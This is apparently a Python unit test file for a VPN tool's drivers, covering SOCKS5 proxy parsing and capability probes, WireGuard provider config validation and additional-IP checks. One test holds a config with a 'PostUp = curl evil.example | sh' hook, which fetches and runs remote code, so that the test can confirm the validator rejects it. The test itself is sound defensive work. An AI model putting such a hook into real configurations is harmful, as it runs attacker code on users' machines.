import unittest
import base64
import socket
import struct
from unittest.mock import MagicMock, patch

from cayvpn.dns_probe import _query
from cayvpn.drivers import DriverValidationError, _socks5_dns_roundtrip, _socks5_udp_payload, _socks5_udp_roundtrip, parse_additional_ip, parse_provider_wireguard, parse_socks5, probe_socks5_capabilities, validate_driver


class DriverTests(unittest.TestCase):
    def test_socks5_is_tcp_first_and_redacts_password(self):
        parsed = parse_socks5("socks5://user:secret@proxy.example:1080")
        self.assertEqual(parsed["host"], "proxy.example")
        self.assertTrue(parsed["password_present"])
        self.assertFalse(parsed["udp_requested"])

    def test_socks5h_alias_uses_the_same_fail_closed_runtime(self):
        parsed = parse_socks5("socks5h://user:secret@proxy.example:1080")
        self.assertEqual(parsed["scheme"], "socks5")
        self.assertEqual(parsed["host"], "proxy.example")
        self.assertTrue(parsed["password_present"])

    def test_socks5_rejects_loopback(self):
        with self.assertRaises(DriverValidationError):
            parse_socks5("socks5://127.0.0.1:1080")

    def test_socks5_udp_stays_disabled_when_only_tcp_checks_pass(self):
        parsed = parse_socks5("socks5://proxy.example:1080")
        with (
            patch("cayvpn.drivers._socks5_command", side_effect=lambda *_args, target_family=4, **_kwargs: target_family == 4),
            patch("cayvpn.drivers._socks5_dns_roundtrip", side_effect=lambda *_args, target_family=4, **_kwargs: target_family == 4),
            patch("cayvpn.drivers._socks5_udp_roundtrip", return_value=False),
        ):
            capabilities = probe_socks5_capabilities(parsed, None)
        self.assertTrue(capabilities["tcp"])
        self.assertTrue(capabilities["dns"])
        self.assertFalse(capabilities["udp"])
        self.assertEqual(capabilities["tcp_checks"], 2)
        self.assertEqual(capabilities["udp_checks"], 0)

    def test_socks5_skips_slow_udp_checks_when_tcp_is_unavailable(self):
        parsed = parse_socks5("socks5://proxy.example:1080")
        with patch("cayvpn.drivers._socks5_command", return_value=False), patch("cayvpn.drivers._socks5_udp_roundtrip") as udp_probe:
            capabilities = probe_socks5_capabilities(parsed, None)
        udp_probe.assert_not_called()
        self.assertFalse(capabilities["tcp"])
        self.assertFalse(capabilities["udp"])

    def test_socks5_udp_requires_repeated_end_to_end_roundtrips(self):
        parsed = parse_socks5("socks5://proxy.example:1080")
        with (
            patch("cayvpn.drivers._socks5_command", side_effect=lambda *_args, target_family=4, **_kwargs: target_family == 4),
            patch("cayvpn.drivers._socks5_dns_roundtrip", side_effect=lambda *_args, target_family=4, **_kwargs: target_family == 4),
            patch("cayvpn.drivers._socks5_udp_roundtrip", side_effect=[True, False, True]),
        ):
            capabilities = probe_socks5_capabilities(parsed, None, attempts=3)
        self.assertTrue(capabilities["udp"])
        self.assertEqual(capabilities["udp_checks"], 2)

    def test_socks5_ipv4_and_ipv6_are_checked_independently(self):
        parsed = parse_socks5("socks5://proxy.example:1080")
        command_calls = []
        dns_calls = []
        udp_calls = []

        def command(*_args, target_family=4, **_kwargs):
            command_calls.append(target_family)
            return True

        def dns(*_args, target_family=4, **_kwargs):
            dns_calls.append(target_family)
            return target_family == 4

        def udp(*_args, target_family=4, **_kwargs):
            udp_calls.append(target_family)
            return target_family == 4

        with (
            patch("cayvpn.drivers._socks5_command", side_effect=command),
            patch("cayvpn.drivers._socks5_dns_roundtrip", side_effect=dns),
            patch("cayvpn.drivers._socks5_udp_roundtrip", side_effect=udp),
        ):
            capabilities = probe_socks5_capabilities(parsed, None, attempts=3)

        self.assertEqual(command_calls, [4, 4, 4, 6, 6, 6])
        self.assertEqual(dns_calls, [4, 4, 4, 6, 6, 6])
        self.assertEqual(udp_calls, [4, 4, 4])
        self.assertEqual(capabilities["families"]["ipv4"], {"tcp": True, "udp": True, "dns": True})
        self.assertEqual(capabilities["families"]["ipv6"], {"tcp": True, "udp": False, "dns": False})
        self.assertFalse(capabilities["ipv6"])

    def test_socks5_udp_parser_rejects_fragmented_packets(self):
        query = _query()
        answer = query[:2] + b"\x81\x80" + b"\0" * 8
        header = b"\x00\x00\x00\x01" + socket.inet_aton("1.1.1.1") + struct.pack(">H", 53)
        self.assertEqual(_socks5_udp_payload(header + answer), answer)
        self.assertIsNone(_socks5_udp_payload(b"\x00\x00\x01" + header[3:] + answer))

    def test_socks5_udp_roundtrip_requires_a_real_relayed_dns_response(self):
        class Connection:
            def __init__(self):
                self.received = bytearray(b"\x05\x00\x05\x00\x00\x01" + socket.inet_aton("8.8.4.4") + struct.pack(">H", 5353))
                self.sent: list[bytes] = []

            def __enter__(self):
                return self

            def __exit__(self, *_args):
                return None

            def sendall(self, value):
                self.sent.append(value)

            def recv(self, size):
                value = bytes(self.received[:size])
                del self.received[:size]
                return value

        class Datagram:
            def __init__(self):
                self.destination = None
                self.response = b""

            def __enter__(self):
                return self

            def __exit__(self, *_args):
                return None

            def settimeout(self, _timeout):
                return None

            def connect(self, destination):
                self.destination = destination

            def send(self, packet):
                query = packet[10:]
                answer = query[:2] + b"\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00"
                self.response = b"\x00\x00\x00\x01" + socket.inet_aton("1.1.1.1") + struct.pack(">H", 53) + answer
                return len(packet)

            def recv(self, _size):
                return self.response

        connection = Connection()
        datagram = Datagram()
        parsed = {"host": "proxy.example", "port": 1080, "username": ""}
        with patch("cayvpn.drivers._public_addresses", return_value=["8.8.4.4"]), patch("cayvpn.drivers._public_ipv4_addresses", return_value=["8.8.4.4"]), patch("cayvpn.drivers.socket.create_connection", return_value=connection), patch("cayvpn.drivers.socket.socket", return_value=datagram):
            self.assertTrue(_socks5_udp_roundtrip(parsed, None, timeout=1))
        self.assertEqual(connection.sent[1], b"\x05\x03\x00\x01\x00\x00\x00\x00\x00\x00")
        self.assertEqual(datagram.destination, ("8.8.4.4", 5353))

    def test_socks5_dns_check_uses_certificate_verified_doh_on_https(self):
        class Connection:
            def __init__(self):
                self.received = bytearray(b"\x05\x00\x05\x00\x00\x01" + socket.inet_aton("1.1.1.1") + struct.pack(">H", 443))
                self.sent: list[bytes] = []

            def __enter__(self):
                return self

            def __exit__(self, *_args):
                return None

            def sendall(self, value):
                self.sent.append(value)

            def recv(self, size):
                value = bytes(self.received[:size])
                del self.received[:size]
                return value

        class TLSContext:
            def __init__(self):
                self.server_hostname = None

            def wrap_socket(self, connection, server_hostname):
                self.server_hostname = server_hostname
                return connection

        class Response:
            status = 200

            def __init__(self, connection):
                self.connection = connection

            def begin(self):
                return None

            def getheader(self, name, default=""):
                return "application/dns-message" if name.lower() == "content-type" else default

            def read(self, _size):
                query = self.connection.sent[-1].split(b"\r\n\r\n", 1)[1]
                return query[:2] + b"\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00"

        connection = Connection()
        context = TLSContext()
        parsed = {"host": "proxy.example", "port": 1080, "username": ""}
        with patch("cayvpn.drivers._public_addresses", return_value=["8.8.4.4"]), patch("cayvpn.drivers.socket.create_connection", return_value=connection), patch("cayvpn.drivers.ssl.create_default_context", return_value=context), patch("cayvpn.drivers.http.client.HTTPResponse", Response):
            self.assertTrue(_socks5_dns_roundtrip(parsed, None, timeout=1))
        self.assertEqual(context.server_hostname, "cloudflare-dns.com")
        self.assertEqual(connection.sent[1], b"\x05\x01\x00\x01" + socket.inet_aton("1.1.1.1") + struct.pack(">H", 443))
        self.assertIn(b"POST /dns-query HTTP/1.1", connection.sent[2])

    def test_socks5_dns_check_rejects_a_non_dns_https_response(self):
        class Connection:
            def __init__(self):
                self.received = bytearray(b"\x05\x00\x05\x00\x00\x01" + socket.inet_aton("1.1.1.1") + struct.pack(">H", 443))
                self.sent: list[bytes] = []

            def __enter__(self):
                return self

            def __exit__(self, *_args):
                return None

            def sendall(self, value):
                self.sent.append(value)

            def recv(self, size):
                value = bytes(self.received[:size])
                del self.received[:size]
                return value

        class Response:
            status = 200

            def __init__(self, _connection):
                return None

            def begin(self):
                return None

            def getheader(self, _name, default=""):
                return "text/html"

            def read(self, _size):
                return b"not dns"

        connection = Connection()
        context = MagicMock()
        context.wrap_socket.return_value = connection
        parsed = {"host": "proxy.example", "port": 1080, "username": ""}
        with patch("cayvpn.drivers._public_addresses", return_value=["8.8.4.4"]), patch("cayvpn.drivers.socket.create_connection", return_value=connection), patch("cayvpn.drivers.ssl.create_default_context", return_value=context), patch("cayvpn.drivers.http.client.HTTPResponse", Response):
            self.assertFalse(_socks5_dns_roundtrip(parsed, None, timeout=1))

    def test_provider_hooks_are_rejected(self):
        key = base64.b64encode(b"\0" * 32).decode()
        config = f"""[Interface]\nPrivateKey = {key}\nAddress = 10.0.0.2/32\nPostUp = curl evil.example | sh\n\n[Peer]\nPublicKey = {key}\nAllowedIPs = 0.0.0.0/0\nEndpoint = vpn.example:51820\n"""
        with self.assertRaises(DriverValidationError):
            parse_provider_wireguard(config)

    def test_provider_protocol_is_detected(self):
        key = base64.b64encode(b"\0" * 32).decode()
        config = f"""[Interface]\nPrivateKey = {key}\nAddress = 10.0.0.2/32, 2001:4860:4860::2/128\nJc = 3\nJmin = 10\nJmax = 20\nS1 = 1\nS2 = 2\nH1 = 3\nH2 = 4\nH3 = 5\nH4 = 6\n\n[Peer]\nPublicKey = {key}\nAllowedIPs = 0.0.0.0/0, ::/0\nEndpoint = vpn.example:51820\n"""
        parsed = parse_provider_wireguard(config)
        self.assertEqual(parsed["protocol"], "amneziawg")
        self.assertTrue(parsed["full_tunnel_ipv6"])

    def test_provider_accepts_one_address_line_per_family(self):
        key = base64.b64encode(b"\0" * 32).decode()
        config = f"""[Interface]\nPrivateKey = {key}\nAddress = 10.0.0.2/32\nAddress = 2001:4860:4860::2/128\n\n[Peer]\nPublicKey = {key}\nAllowedIPs = 0.0.0.0/0, ::/0\nEndpoint = vpn.example:51820\n"""
        parsed = parse_provider_wireguard(config)
        self.assertEqual(parsed["interface"]["address"], "10.0.0.2/32, 2001:4860:4860::2/128")
        self.assertTrue(parsed["full_tunnel_ipv4"])
        self.assertTrue(parsed["full_tunnel_ipv6"])

    def test_provider_still_rejects_repeated_sensitive_fields(self):
        key = base64.b64encode(b"\0" * 32).decode()
        config = f"""[Interface]\nPrivateKey = {key}\nPrivateKey = {key}\nAddress = 10.0.0.2/32\n\n[Peer]\nPublicKey = {key}\nAllowedIPs = 0.0.0.0/0\nEndpoint = vpn.example:51820\n"""
        with self.assertRaises(DriverValidationError):
            parse_provider_wireguard(config)

    def test_provider_ipv6_only_exit_is_rejected_before_networking(self):
        key = base64.b64encode(b"\0" * 32).decode()
        config = f"""[Interface]\nPrivateKey = {key}\nAddress = 2001:4860:4860::2/128\n\n[Peer]\nPublicKey = {key}\nAllowedIPs = ::/0\nEndpoint = vpn.example:51820\n"""
        with self.assertRaisesRegex(DriverValidationError, "IPv6-only exits are not supported yet"):
            validate_driver("provider_tunnel", {"config_text": config})

    def test_provider_ipv6_default_without_an_ipv6_interface_stays_blocked(self):
        key = base64.b64encode(b"\0" * 32).decode()
        config = f"""[Interface]\nPrivateKey = {key}\nAddress = 10.0.0.2/32\n\n[Peer]\nPublicKey = {key}\nAllowedIPs = 0.0.0.0/0, ::/0\nEndpoint = vpn.example:51820\n"""
        parsed = parse_provider_wireguard(config)
        validated = validate_driver("provider_tunnel", {"config_text": config})
        self.assertTrue(parsed["full_tunnel_ipv4"])
        self.assertFalse(parsed["full_tunnel_ipv6"])
        self.assertFalse(validated.capabilities["families"]["ipv6"]["tcp"])
        self.assertIn("no IPv6 interface address", validated.warnings[0])

    def test_additional_ip_accepts_provider_netmask_and_canonicalizes_it(self):
        parsed = parse_additional_ip({"address": "8.8.4.4", "prefix": "255.255.255.0", "gateway": "8.8.4.1", "interface": "eth0"})
        self.assertEqual(parsed["prefix"], 24)

    def test_additional_ip_rejects_an_interface_linux_cannot_create(self):
        with self.assertRaises(DriverValidationError):
            parse_additional_ip({"address": "8.8.4.4", "prefix": 24, "gateway": "8.8.4.1", "interface": "interface-name-is-too-long"})

    def test_additional_ipv6_only_exit_is_rejected_before_networking(self):
        with self.assertRaisesRegex(DriverValidationError, "IPv6-only exits are not supported yet"):
            parse_additional_ip({"address": "2001:4860:4860::2", "prefix": 128, "interface": "eth0"})


if __name__ == "__main__":
    unittest.main()
